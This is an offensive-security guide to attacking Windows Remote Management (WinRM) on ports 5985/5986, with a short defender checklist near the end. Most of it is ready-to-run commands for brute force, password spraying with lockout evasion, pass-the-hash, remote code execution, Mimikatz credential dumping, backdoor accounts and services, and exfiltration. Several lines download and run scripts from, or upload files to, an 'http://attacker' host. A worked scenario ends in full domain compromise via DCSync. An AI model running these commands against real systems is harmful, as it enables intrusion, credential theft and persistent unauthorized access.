# Port 5985/5986 - WinRM (Windows Remote Management) - Complete Attack Guide

## 📖 Overview

**Protocol**: WinRM (Windows Remote Management)
**Ports**: 5985 (HTTP), 5986 (HTTPS)
**Transport**: TCP
**Encryption**: None (5985), TLS/SSL (5986)
**Authentication**: Kerberos, NTLM, CredSSP, Certificate

## 🎯 Attack Objectives

- **Remote Command Execution**: Execute PowerShell remotely
- **Lateral Movement**: Move across Windows network
- **Pass-the-Hash**: Use NTLM hash for authentication
- **Credential Harvesting**: Extract credentials from remote systems
- **Privilege Escalation**: Escalate via WinRM
- **Persistence**: Maintain access via PS remoting
- **Data Exfiltration**: Extract files and data

## 🔍 Attack Methodology

### Phase 1: Discovery and Reconnaissance

**1.1 Detect WinRM Service**
```bash
# Quick scan
nmap -p 5985,5986 192.168.1.100

# Service version
nmap -p 5985,5986 -sV 192.168.1.100

# WinRM scripts
nmap -p 5985 --script http-methods,http-headers 192.168.1.100

# Network-wide discovery
nmap -p 5985,5986 192.168.1.0/24 --open

# Check if WinRM enabled
crackmapexec winrm 192.168.1.0/24
```

**1.2 Enumerate WinRM Configuration**
```bash
# Test connection
curl -u 'user:password' http://192.168.1.100:5985/wsman

# Check authentication methods
nmap -p 5985 --script http-auth 192.168.1.100

# Using Evil-WinRM
evil-winrm -i 192.168.1.100 -u user -p password -e
```

**1.3 User Enumeration**
```bash
# Brute force users
crackmapexec winrm 192.168.1.100 -u users.txt -p password --continue-on-success

# Valid user gives different response
# Check timing differences
```

### Phase 2: Authentication Attacks

**2.1 Default Credentials**
```bash
# Common defaults
Administrator:Password
Administrator:Password123
administrator:admin
administrator:P@ssw0rd
vagrant:vagrant  # Vagrant boxes

# Test defaults
evil-winrm -i 192.168.1.100 -u Administrator -p Password
```

**2.2 Brute Force Attack**
```bash
# Using CrackMapExec
crackmapexec winrm 192.168.1.100 -u administrator -P passwords.txt

# Using Hydra
hydra -l administrator -P passwords.txt 192.168.1.100 http-post -s 5985

# Using Metasploit
use auxiliary/scanner/winrm/winrm_login
set RHOSTS 192.168.1.100
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

**2.3 Password Spraying**
```bash
# Using CrackMapExec
crackmapexec winrm 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success

# Avoid lockout - one password at a time
crackmapexec winrm 192.168.1.0/24 -u users.txt -p 'Summer2024'
sleep 600  # Wait 10 minutes
crackmapexec winrm 192.168.1.0/24 -u users.txt -p 'Winter2024'

# Using Evil-WinRM in loop
for user in $(cat users.txt); do
  evil-winrm -i 192.168.1.100 -u $user -p 'Password123' -e /bin/true 2>&1 | grep -q "Error" || echo "SUCCESS: $user:Password123"
  sleep 5
done
```

**2.4 Pass-the-Hash Attack**
```bash
# Using Evil-WinRM
evil-winrm -i 192.168.1.100 -u administrator -H NTLM_HASH

# Using CrackMapExec
crackmapexec winrm 192.168.1.100 -u administrator -H NTLM_HASH

# Using Impacket (if WinRM supports NTLM)
# WinRM typically requires plaintext or Kerberos
# But some configs allow NTLM hash

# Pass-the-Hash via Kerberos (Overpass-the-Hash)
getTGT.py corp.local/administrator -hashes :NTLM_HASH
export KRB5CCNAME=administrator.ccache
evil-winrm -i target.corp.local -r corp.local
```

### Phase 3: Remote Code Execution

**3.1 PowerShell Remoting**
```bash
# Using Evil-WinRM
evil-winrm -i 192.168.1.100 -u administrator -p password

# Commands
*Evil-WinRM* PS C:\> whoami
*Evil-WinRM* PS C:\> hostname
*Evil-WinRM* PS C:\> ipconfig

# Run script
*Evil-WinRM* PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')

# Upload file
*Evil-WinRM* PS C:\> upload /local/file.exe C:\temp\file.exe

# Download file
*Evil-WinRM* PS C:\> download C:\temp\data.txt /local/data.txt
```

**3.2 Using PowerShell (Windows Attacker)**
```powershell
# Test connection
Test-WSMan -ComputerName 192.168.1.100

# Enter remote session
Enter-PSSession -ComputerName 192.168.1.100 -Credential (Get-Credential)

# Run remote command
Invoke-Command -ComputerName 192.168.1.100 -Credential $cred -ScriptBlock { whoami }

# Multiple hosts
Invoke-Command -ComputerName 192.168.1.100,192.168.1.101 -Credential $cred -ScriptBlock { Get-Process }

# Run script remotely
Invoke-Command -ComputerName 192.168.1.100 -Credential $cred -FilePath C:\scripts\script.ps1
```

**3.3 Using CrackMapExec**
```bash
# Execute command
crackmapexec winrm 192.168.1.100 -u administrator -p password -x "whoami"

# Execute PowerShell
crackmapexec winrm 192.168.1.100 -u administrator -p password -X 'Get-Process'

# Multiple hosts
crackmapexec winrm 192.168.1.0/24 -u administrator -p password -x "ipconfig"

# With hash
crackmapexec winrm 192.168.1.100 -u administrator -H NTLM_HASH -x "whoami"
```

**3.4 Using Metasploit**
```bash
use exploit/windows/winrm/winrm_script_exec
set RHOSTS 192.168.1.100
set USERNAME administrator
set PASSWORD password
set FORCE_VBS true
exploit

# Get meterpreter session
# Or use auxiliary
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS 192.168.1.100
set USERNAME administrator
set PASSWORD password
set CMD whoami
run
```

### Phase 4: Post-Exploitation

**4.1 Credential Harvesting**
```bash
# Using Evil-WinRM
*Evil-WinRM* PS C:\> Invoke-Mimikatz

# Or upload Mimikatz
upload /tools/mimikatz.exe C:\temp\m.exe
*Evil-WinRM* PS C:\> C:\temp\m.exe privilege::debug sekurlsa::logonpasswords exit

# Dump SAM
*Evil-WinRM* PS C:\> reg save HKLM\SAM C:\temp\sam
*Evil-WinRM* PS C:\> reg save HKLM\SYSTEM C:\temp\system
download C:\temp\sam /tmp/sam
download C:\temp\system /tmp/system

# Extract with secretsdump
secretsdump.py -sam /tmp/sam -system /tmp/system LOCAL
```

**4.2 Lateral Movement**
```bash
# From compromised host, access others
*Evil-WinRM* PS C:\> Enter-PSSession -ComputerName 192.168.1.101

# Copy and execute
*Evil-WinRM* PS C:\> Copy-Item C:\payload.exe \\192.168.1.101\C$\temp\
*Evil-WinRM* PS C:\> Invoke-Command -ComputerName 192.168.1.101 -ScriptBlock { C:\temp\payload.exe }

# Using CrackMapExec
crackmapexec winrm 192.168.1.0/24 -u administrator -p password -x "whoami"
```

**4.3 Privilege Escalation**
```bash
# Check privileges
*Evil-WinRM* PS C:\> whoami /priv

# Check if admin
*Evil-WinRM* PS C:\> net localgroup administrators

# Bypass UAC (if needed)
*Evil-WinRM* PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://attacker/Invoke-EventVwrBypass.ps1'); Invoke-EventVwrBypass -Command "C:\payload.exe"

# Token manipulation
*Evil-WinRM* PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://attacker/Invoke-TokenManipulation.ps1'); Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "NT AUTHORITY\SYSTEM"
```

**4.4 Persistence**
```bash
# Create scheduled task
*Evil-WinRM* PS C:\> schtasks /create /tn "Update" /tr "C:\backdoor.exe" /sc onstart /ru SYSTEM

# Create service
*Evil-WinRM* PS C:\> sc.exe create "Update" binPath= "C:\backdoor.exe" start= auto
*Evil-WinRM* PS C:\> sc.exe start "Update"

# Add user to Remote Management Users group
*Evil-WinRM* PS C:\> net user backdoor Password123! /add
*Evil-WinRM* PS C:\> net localgroup "Remote Management Users" backdoor /add
*Evil-WinRM* PS C:\> net localgroup administrators backdoor /add

# Registry persistence
*Evil-WinRM* PS C:\> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\backdoor.exe"
```

**4.5 Data Exfiltration**
```bash
# Download files
*Evil-WinRM* PS C:\> download C:\Users\Administrator\Documents\* /loot/docs/

# Compress and download
*Evil-WinRM* PS C:\> Compress-Archive -Path C:\sensitive\* -DestinationPath C:\temp\data.zip
*Evil-WinRM* PS C:\> download C:\temp\data.zip /loot/data.zip

# Using PowerShell
$cred = Get-Credential
$session = New-PSSession -ComputerName 192.168.1.100 -Credential $cred
Copy-Item C:\remote\file.txt C:\local\ -FromSession $session

# Exfiltrate via HTTP
*Evil-WinRM* PS C:\> Invoke-WebRequest -Uri http://attacker/upload -Method POST -InFile C:\sensitive.txt
```

### Phase 5: Advanced Attacks

**5.1 WinRM Session Hijacking**
```bash
# If you have local admin but WinRM uses different creds
# Steal session or inject into process

# Using Mimikatz
*Evil-WinRM* PS C:\> Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corp /ntlm:HASH /run:powershell.exe"'

# Then connect
Enter-PSSession -ComputerName target.corp.local
```

**5.2 Kerberos Delegation via WinRM**
```bash
# If target has unconstrained delegation
# Connect via WinRM and extract tickets

*Evil-WinRM* PS C:\> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Download tickets
*Evil-WinRM* PS C:\> download C:\tickets\* /loot/tickets/

# Use tickets from attacker machine
```

**5.3 Double Hop Problem Bypass**
```bash
# WinRM has "double hop" limitation
# Credentials don't forward to third system

# Bypass with CredSSP
Enter-PSSession -ComputerName 192.168.1.100 -Authentication CredSSP -Credential $cred

# Or register creds in session
$cred = Get-Credential
Invoke-Command -ComputerName 192.168.1.100 -Credential $cred -ScriptBlock {
  $cred2 = Get-Credential  # Re-enter creds
  Invoke-Command -ComputerName 192.168.1.101 -Credential $cred2 -ScriptBlock { whoami }
}
```

## 🛡️ Bypass Techniques

### Bypassing Firewall
```bash
# SSH tunnel to access WinRM
ssh -L 5985:192.168.1.100:5985 user@jumphost
evil-winrm -i localhost -u administrator -p password

# Or SOCKS proxy
ssh -D 1080 user@jumphost
proxychains evil-winrm -i 192.168.1.100 -u administrator -p password
```

### Bypassing Restricted PowerShell
```bash
# If PowerShell restricted
*Evil-WinRM* PS C:\> cmd /c whoami

# Use encoded commands
$cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
*Evil-WinRM* PS C:\> powershell -EncodedCommand $cmd

# Bypass execution policy
*Evil-WinRM* PS C:\> powershell -ExecutionPolicy Bypass -File script.ps1
```

### Bypassing Account Lockout
```bash
# Slow brute force
crackmapexec winrm 192.168.1.100 -u admin -P passwords.txt --continue-on-success -t 1

# Password spraying instead
crackmapexec winrm 192.168.1.0/24 -u users.txt -p 'Password123'
```

## 📊 Information Extraction

**Key Commands**:
```powershell
# System info
systeminfo
Get-ComputerInfo

# Network
ipconfig /all
route print
arp -a

# Users
net user
net localgroup administrators
Get-LocalUser

# Processes
Get-Process
tasklist

# Services
Get-Service
sc query

# Installed software
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*
```

## 🔐 Security Recommendations

**For Defenders**:
1. **Disable WinRM** - If not needed
2. **Firewall Rules** - Restrict to management network
3. **Strong Passwords** - Enforce complexity
4. **Certificate Authentication** - Use instead of passwords
5. **HTTPS Only** - Port 5986 with valid cert
6. **Limit Users** - Only specific admin accounts
7. **Monitor Logs** - Event ID 4624, 4625 (logins)
8. **Network Segmentation** - Isolate admin network
9. **Disable NTLM** - Kerberos only if possible
10. **JEA** - Just Enough Administration

## 🎯 Practical Attack Scenario

```bash
# Discovery
nmap -p 5985 192.168.1.0/24 --open
# Found: 20 hosts with WinRM

# Password spray
crackmapexec winrm 192.168.1.0/24 -u users.txt -p 'Summer2024'
# SUCCESS: john:Summer2024 on 192.168.1.50

# Connect
evil-winrm -i 192.168.1.50 -u john -p Summer2024

# Enumerate
*Evil-WinRM* PS C:\> whoami /priv
# SeDebugPrivilege enabled!

# Dump credentials
upload /tools/mimikatz.exe C:\temp\m.exe
*Evil-WinRM* PS C:\> C:\temp\m.exe privilege::debug sekurlsa::logonpasswords exit

# Found: admin:P@ssw0rd (cleartext!)

# Lateral movement
evil-winrm -i 192.168.1.100 -u admin -p 'P@ssw0rd'
# Domain controller!

# DCSync
*Evil-WinRM* PS C:\> C:\temp\m.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit

# Domain compromised!
```

## 📚 Tools Summary

**Best Tool for Each Task**:
- **Connection**: Evil-WinRM (Linux), PowerShell (Windows)
- **Brute Force**: CrackMapExec
- **Lateral Movement**: CrackMapExec, PowerShell
- **Credential Dump**: Mimikatz, Invoke-Mimikatz
- **Automation**: PowerShell scripts

## 🔗 Related Attacks

- **Port 445 (SMB)**: Often same credentials
- **Port 3389 (RDP)**: Alternative remote access
- **Port 135 (RPC)**: Related Windows service
- **Port 88 (Kerberos)**: Authentication attacks

---

**Last Updated**: 2026-06-16
